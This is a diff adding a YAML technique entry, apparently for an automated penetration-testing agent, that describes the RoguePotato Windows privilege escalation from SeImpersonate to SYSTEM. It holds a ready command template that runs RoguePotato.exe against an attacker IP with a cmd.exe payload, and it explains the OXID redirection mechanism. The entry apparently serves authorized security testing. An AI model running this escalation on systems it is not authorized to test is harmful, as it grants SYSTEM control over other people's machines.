@@ -1,0 +1,32 @@
+name: roguepotato
+category: privesc
+description: RoguePotato — SeImpersonate → SYSTEM via RPC OXID redirection on 135
+preconditions:
+- shell_obtained
+- se_impersonate_privilege
+parameters:
+  attacker_ip: from_engagement.attacker_ip
+command_template: RoguePotato.exe -r {attacker_ip} -e "cmd.exe /c whoami > C:\\Windows\\Temp\\p.txt"
+  -l 9999
+parser: generic_parser
+expected_effects:
+- system_shell
+- root_access
+falsifier:
+  pattern: patched|SeImpersonate missing|RPC 135 blocked
+  timeout: 60
+model_tier: haiku
+mechanism: 'Post-JuicyPotato fix Microsoft closed the trick of hitting 127.0.0.1:135
+  — but
+
+  RoguePotato redirects OXID resolution to an attacker-controlled remote host on
+
+  135 that forwards back, restoring the Marshaller trick. Produces a SYSTEM token
+
+  via IStorageTrigger activation + SeImpersonate.
+
+  '
+references:
+  ocd_mindmap: 'Branch 11: RoguePotato'
+  hacktricks: windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.md
+hacktricks_ref: windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.md
